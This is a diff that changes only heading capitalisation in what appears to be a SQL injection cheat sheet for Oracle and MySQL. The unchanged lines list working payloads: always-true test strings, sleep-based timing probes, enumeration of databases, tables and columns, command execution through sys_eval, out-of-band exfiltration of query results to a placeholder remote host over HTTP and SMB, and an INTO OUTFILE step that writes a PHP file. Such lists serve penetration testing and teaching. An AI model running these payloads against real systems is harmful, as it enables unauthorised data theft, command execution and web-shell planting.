@@ -1,4 +1,4 @@
-### test strings
+### Test strings
 ```
 '
 "
@@ -13,7 +13,7 @@
 " OR "1" = "1" #
 ```
 
-### comment
+### Comment
 ```
 Oracle:
 --comment
@@ -26,7 +26,7 @@ MySQL:
 /*comment*/
 ```
 
-### version
+### Version
 ```
 Oracle:
 SELECT banner FROM v$version
@@ -39,7 +39,7 @@ MySQL:
 SELECT @@version
 ```
 
-### database name
+### Database name
 ```
 Oracle: 
 SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual
@@ -50,7 +50,7 @@ MySQL:
 SELECT database()
 ```
 
-### sleep
+### Sleep
 ```
 Oracle:
 dbms_pipe.receive_message(('a'),10)
@@ -62,7 +62,7 @@ MySQL:
 SELECT sleep(10)
 ```
 
-### current user's privilege
+### Current user's privilege
 ```
 Oracle:
 SELECT privilege FROM session_privs
@@ -83,7 +83,7 @@ MySQL (UDF):
 SELECT sys_eval('<command>')  
 ```
 
-### list databases
+### List databases
 ```
 Oracle:
 SELECT DISTINCT owner FROM all_tables
@@ -95,7 +95,7 @@ MySQL:
 SELECT schema_name FROM information_schema.schemata
 ```
 
-### select tables
+### Select tables
 ```
 Oracle:
 SELECT table_name FROM all_tables WHERE owner='<database>'
@@ -107,7 +107,7 @@ MySQL:
 SELECT table_name FROM information_schema.tables WHERE table_schema='<database>'
 ```
 
-### select columns
+### Select columns
 ```
 Oracle:
 SELECT column_name FROM all_tab_columns WHERE owner='<database>' AND table_name='<table>'
@@ -119,7 +119,7 @@ MySQL:
 SELECT column_name FROM information_schema.columns WHERE table_schema='<database>' AND table_name='<table>'
 ```
 
-### get content of column
+### Get content of column
 ```
 Oracle:
 SELECT <column> FROM <database>.<table>
@@ -131,7 +131,7 @@ MySQL:
 SELECT <column> FROM <database>.<table>
 ```
 
-### data exfiltration (only one row)
+### Data exfiltration (only one row)
 ```
 Oracle (via HTTP):
 SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://<rhost>/'||(<query>)||'/"> %remote;]>'),'/l') FROM dual
@@ -141,25 +141,25 @@ MySQL (via SMB - works only on windows):
 set @p=(<query> LIMIT <number>,1) ; SELECT LOAD_FILE(concat('\\\\<lhost>\\',@p))
 ```
 
-### write to file
+### Write to file
 ```
 MySQL:
 SELECT '<phpCommand>' INTO OUTFILE '<path>/<file>.php'
 ```
 
-### get amount of columns (MySQL):
+### Get amount of columns (MySQL):
 ```
 foo' order by 10#
 foo' order by 9#
 ```
 
-### or
+### Or
 ```
 foo' union select null--
 foo' union select null,null--
 ```
 
-### find correct data type for columns
+### Find correct data type for columns
 ```
 ' union select 'a',null#
 ' union select null,'a'#
